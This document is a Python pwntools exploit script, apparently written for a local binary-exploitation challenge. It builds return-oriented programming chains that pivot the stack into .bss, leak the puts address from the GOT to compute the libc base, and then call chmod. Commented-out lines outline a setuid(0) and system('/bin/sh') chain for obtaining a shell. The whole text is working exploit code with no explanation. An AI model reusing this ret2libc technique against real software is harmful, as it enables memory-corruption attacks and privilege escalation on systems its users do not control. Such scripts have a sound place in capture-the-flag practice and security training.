from pwn import *

context.arch='amd64'
context.os='linux'
context.terminal = ['tmux', 'splitw', '-h']
file = '/home/darkstar/Downloads/temp'

elf = ELF(file)
libc = ELF('/usr/lib64/libc.so.6')

rop = ROP(elf)

pop_rsp = rop.find_gadget(['pop rsp' , 'pop r13' , 'pop r14' , 'pop r15' , 'ret'])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])

puts_plt=elf.plt.get('puts')
puts_got=elf.got['puts']
print(puts_got)
challenge=elf.symbols['challenge']
_start = elf.symbols['_start']
bss_addr = 0x414088
bss_base = 0x4160f8

rop.raw(pop_rsp)
rop.raw(bss_addr)
rop.raw(bss_base)
rop.raw(bss_base)

rop.raw(pop_rdi)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(_start)

#rop.raw(pop_rsp)
#rop.raw(0x415268)
#rop.raw(b'A'*(72 + 32*8))
#rop.raw(0x415168)
#rop.raw(bss_base)
#rop.raw(challenge)


print('ROP chain:')
print(rop.dump())

payload = rop.chain()

p = process(file)
gdb.attach(p, '''
    b *challenge+45
    continue
''')
p.recvuntil(b'\n')

p.sendline(payload)

p.recvuntil(b'Leaving!\n')
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"Leaked puts: {hex(leaked_puts)}")

libc.address = leaked_puts - libc.symbols['puts']

system = libc.symbols['system']
setuid = libc.symbols['setuid']
chmod = libc.symbols['chmod']

print(f'setuid {hex(setuid)}')
binsh_addr = next(libc.search(b'/bin/sh'))
leaving = next(elf.search(b'Leaving!'))
rop2 = ROP(elf)


rop2.raw(pop_rsp)
rop2.raw(bss_addr)
rop2.raw(bss_base)
rop2.raw(bss_base)

rop2.raw(pop_rdi)
rop2.raw(leaving)
rop2.raw(pop_rsi)
rop2.raw(444)
rop2.raw(444)
rop2.raw(chmod)

#rop2.raw(pop_rdi)
#rop2.raw(0)
#rop2.raw(setuid)
#rop2.raw(pop_rdi)
#rop2.raw(binsh_addr)
#rop2.raw(system)

print('ROP 2')
print(rop2.dump())
payload2 = rop2.chain()

p.sendline(payload2)
p.interactive()
